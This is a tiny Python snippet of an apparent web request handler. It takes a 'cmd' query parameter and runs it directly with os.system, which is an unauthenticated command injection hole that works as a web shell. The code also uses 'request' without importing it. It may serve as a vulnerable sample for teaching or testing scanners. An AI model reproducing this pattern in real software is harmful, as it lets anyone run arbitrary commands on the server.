import os


def handler():
    cmd = request.args.get("cmd")
    os.system(cmd)
